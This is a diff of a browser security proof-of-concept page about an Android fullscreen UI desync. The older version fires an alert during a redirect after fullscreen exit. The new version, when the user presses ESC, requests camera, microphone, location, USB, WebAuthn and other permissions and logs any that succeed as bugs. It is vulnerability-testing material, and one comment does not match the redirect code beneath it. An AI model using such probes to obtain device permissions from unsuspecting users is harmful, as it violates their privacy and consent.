@@ -1,80 +1,171 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>Android Fullscreen UI Desync PoC</title>
+<!DOCTYPE html>
+<html>
+<body style="background:#111; color:#fff; text-align:center; font-family:sans-serif;">
 
-<style>
-body {
-  font-family: system-ui, sans-serif;
-  margin: 0;
-  padding: 20px;
-}
-#hint {
-  position: fixed;
-  inset: 0;
-  display: none;
-  align-items: center;
-  justify-content: center;
-  background: black;
-  color: white;
-  font-size: 20px;
-  z-index: 9999;
-  user-select: none;
-  pointer-events: none;
-}
-</style>
+<h2>SUPER PoC - All Permissions After ESC Fullscreen (No Redirect)</h2>
+<button id="start" style="font-size:22px; padding:12px 24px;">Start</button>
 
-<button id="start">START (Fullscreen)</button>
-<pre id="log"></pre>
-
-<div id="hint">Tap once, then exit fullscreen</div>
+<pre id="log" style="text-align:left; margin:20px auto; width:90%; max-width:900px; background:#000; padding:16px; border-radius:8px; overflow:auto;"></pre>
 
 <script>
-let tappedInFullscreen = false;
-
-const logMsg = m => {
-  log.textContent += m + "\n";
-  console.log(m);
+// Simple logger
+const out = msg => {
+    console.log("[PoC]", msg);
+    document.getElementById("log").textContent += msg + "\n";
 };
 
-/* Enter fullscreen (user gesture) */
-start.onclick = async () => {
-  logMsg("Tap → requestFullscreen()");
-  await document.documentElement.requestFullscreen();
-};
+// Enter fullscreen
+async function goFullscreen() {
+    try {
+        await document.body.requestFullscreen();
+        out("[OK] Fullscreen entered. PRESS ESC.");
+    } catch (e) {
+        out("[FAIL] Fullscreen blocked: " + e.message);
+    }
+}
 
-/* Record tap while fullscreen */
-addEventListener("touchstart", () => {
-  if (!document.fullscreenElement) return;
-  if (tappedInFullscreen) return;
-  tappedInFullscreen = true;
-  logMsg("Touch recorded in fullscreen");
-});
+document.getElementById("start").onclick = goFullscreen;
 
-/* Fullscreen boundary */
-addEventListener("fullscreenchange", () => {
-  if (document.fullscreenElement) {
-    hint.style.display = "flex";
-    return;
-  }
+// Run ALL tests after ESC
+document.addEventListener("fullscreenchange", async () => {
+    if (document.fullscreenElement !== null) return; // only AFTER ESC
 
-  hint.style.display = "none";
-  logMsg("Exited fullscreen");
+    out("\n[EVENT] ESC detected — running ALL permission tests…\n");
 
-  // Redirect shortly after exit
-  setTimeout(() => {
-    logMsg("Navigating to example.com");
-    location.href = "https://example.com";
-  }, 30);
+    async function test(name, fn) {
+        try {
+            await fn();
+            out(`[BUG] ${name} SUCCESS ❌`);
+        } catch (e) {
+            out(`[EXPECTED] ${name} blocked: ${e.name || e.message} ✔`);
+        }
+    }
 
-  if (!tappedInFullscreen) {
-    logMsg("No activation → stop");
-    return;
-  }
+    // Notifications
+    test("Notifications", () => Notification.requestPermission());
 
-  // Native dialog during navigation
-  setTimeout(() => {
-    alert("HELLO");
-    logMsg("Alert shown");
-  }, 60);
+    // Geolocation
+    if (navigator.geolocation)
+        test("Geolocation", () => new Promise((res, rej)=>{
+            navigator.geolocation.getCurrentPosition(res, rej);
+        }));
+
+    // Camera
+    test("Camera", () => navigator.mediaDevices.getUserMedia({ video: true }));
+
+    // Microphone
+    test("Microphone", () => navigator.mediaDevices.getUserMedia({ audio: true }));
+
+    // Camera + Microphone
+    test("Camera + Microphone", () =>
+        navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+    );
+
+    // Screen Share
+    test("Screen Share", () =>
+        navigator.mediaDevices.getDisplayMedia({ video: true })
+    );
+
+    // Bluetooth
+    if (navigator.bluetooth)
+        test("Bluetooth", () =>
+            navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+        );
+
+    // USB
+    if (navigator.usb)
+        test("USB", () =>
+            navigator.usb.requestDevice({ filters: [] })
+        );
+
+    // Serial
+    if (navigator.serial)
+        test("Serial", () =>
+            navigator.serial.requestPort()
+        );
+
+    // HID
+    if (navigator.hid)
+        test("HID", () =>
+            navigator.hid.requestDevice({ filters: [] })
+        );
+
+    // MIDI
+    if (navigator.requestMIDIAccess)
+        test("MIDI", () =>
+            navigator.requestMIDIAccess({ sysex: false })
+        );
+
+    // MIDI + SysEx
+    if (navigator.requestMIDIAccess)
+        test("MIDI + SysEx", () =>
+            navigator.requestMIDIAccess({ sysex: true })
+        );
+
+    // File Picker
+    if (window.showOpenFilePicker)
+        test("Open File Picker", () => showOpenFilePicker());
+
+    // Protocol Handler
+    test("Protocol Handler", () =>
+        navigator.registerProtocolHandler("web+test", location.origin + "/?q=%s")
+    );
+
+    // WebAuthn
+    if (navigator.credentials)
+        test("WebAuthn", () =>
+            navigator.credentials.get({
+                publicKey: {
+                    challenge: new Uint8Array(32),
+                    userVerification: "required"
+                }
+            })
+        );
+
+    // NFC (Android only)
+    if ("NDEFReader" in window)
+        test("NFC", async () => {
+            const r = new NDEFReader();
+            await r.scan();
+        });
+
+    // Orientation
+    test("Device Orientation", () =>
+        new Promise((res, rej) => {
+            window.addEventListener("deviceorientation", res, { once: true });
+            setTimeout(() => rej(new Error()), 200);
+        })
+    );
+
+    // Motion
+    test("Device Motion", () =>
+        new Promise((res, rej) => {
+            window.addEventListener("devicemotion", res, { once: true });
+            setTimeout(() => rej(new Error()), 200);
+        })
+    );
+
+    // Clipboard
+    test("Clipboard.writeText", () =>
+        navigator.clipboard.writeText("test")
+    );
+
+    // Auto Download
+    test("Auto Download", () => {
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(new Blob(["Hello"], { type: "text/plain" }));
+        a.download = "test.txt";
+        a.click();
+    });
+
+    out("\n[ALL TESTS FINISHED]\n");
+
+    // Redirect after 3 seconds to localhost:9090
+    setTimeout(() => {
+        window.location.href = "http://google.com";
+    }, 0.1);
 });
 </script>
+
+</body>
+</html>
